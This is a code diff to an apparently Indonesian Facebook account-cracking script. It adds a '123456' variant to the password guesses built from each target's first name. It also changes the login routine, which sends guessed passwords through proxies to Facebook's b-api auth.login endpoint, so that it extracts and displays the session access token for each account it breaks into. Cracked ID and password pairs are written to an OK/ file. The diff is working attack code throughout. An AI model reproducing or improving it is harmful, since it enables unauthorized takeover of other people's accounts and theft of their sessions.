@@ -1033,7 +1033,7 @@ def metcepat():
                         pwv.append(frs+'123')
                         pwv.append(frs+'1234')
                         pwv.append(frs+'12345')
-                        
+                        pwv.append(frs+'123456')
                 else:
                     if len(frs)<3:
                         pwv.append(nmf)
@@ -1043,7 +1043,7 @@ def metcepat():
                         pwv.append(frs+'123')
                         pwv.append(frs+'1234')
                         pwv.append(frs+'12345')
-                        
+                        pwv.append(frs+'123456')
                 if 'ya' in pwpluss: 
                     for xpwd in pwnya:
                         pwv.append(xpwd)
@@ -1314,15 +1314,15 @@ def fanky_b_api(idf, pwv):
 			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': idf, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
 			api = 'https://b-api.facebook.com/method/auth.login'
 			po = requests.get(api, params=params, headers=headers,proxies=proxs) 
-			#match = re.search(r'(EAAA\w+)', po.text)
-			if re.search(r'(EAAA)\w+', str(po.text)):
+			match = re.search(r'(EAAA)\w+', str(po.text))
+			if match:
 				ok += 1
-				#access_token = match.group(1)  # Ambil token yang coco
+				access_token = match.group(1)  # Ambil token yang cocok
 				tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
 				tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
 				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
 				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
-				#tree.add(Panel(f"{U2}{access_token}{P2}", style=f"{color_panel}"))
+				tree.add(Panel(f"{U2}{access_token}{P2}", style=f"{color_panel}"))
 				prints(tree)
 				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
 				break
